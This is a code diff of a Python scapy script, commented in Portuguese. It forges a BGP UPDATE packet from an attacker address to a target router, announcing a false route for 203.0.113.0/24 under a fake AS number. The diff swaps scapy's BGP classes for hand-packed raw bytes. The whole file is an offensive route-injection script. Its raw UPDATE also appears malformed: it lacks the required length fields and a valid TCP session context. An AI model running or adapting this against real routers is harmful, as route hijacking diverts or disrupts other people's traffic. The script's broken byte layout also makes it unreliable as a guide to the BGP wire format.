@@ -1,25 +1,24 @@
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
-from scapy.contrib.bgp import BGPHeader, BGPUpdate, BGPPathAttr, BGPNLRI_IPv4
+from scapy.contrib.bgp import BGPHeader, BGPUpdate, BGPPathAttr
 
 # Configurações do BGP
 src_ip = "10.0.0.1"  # IP de origem do atacante
 dst_ip = "10.0.0.2"  # IP do roteador BGP alvo
-src_port = 179         # Porta de origem BGP
-bgp_as = 65001         # Sistema Autônomo falso
+src_port = 179        # Porta de origem BGP
+bgp_as_path = b'\x40\x02\x00\x02\xfd\xe9'  # AS_PATH (ASN 65001)
+bgp_next_hop = b'\x40\x03\x04\x0a\x00\x00\x01'  # NEXT_HOP (10.0.0.1)
 
-# Construção do pacote BGP Update com rota falsa
-bgp_update = (
-    IP(src=src_ip, dst=dst_ip) /
-    TCP(sport=src_port, dport=179, flags="PA", seq=1000, ack=1000) /
-    BGPHeader(type=2) /
-    BGPUpdate(
-        path_attr=[BGPPathAttr(type_flags=0x40, type_code=2, value=bgp_as)],
-        nlri=[BGPNLRI_IPv4(prefix="203.0.113.0", prefix_len=24)]
-    )
-)
+# NLRI (prefixo)
+nlri = b'\x18\xcb\x00\x71'  # Prefixo 203.0.113.0/24
+
+# Construção do pacote BGP Update
+bgp_update = BGPHeader() / Raw(b'\x02' + bgp_as_path + bgp_next_hop + nlri)
+
+# Construção do pacote TCP/IP
+packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=179, flags="PA") / bgp_update
 
 # Envio do pacote manipulado
-send(bgp_update)
+send(packet, verbose=1)
 
 print("Pacote BGP com rota falsa enviado.")
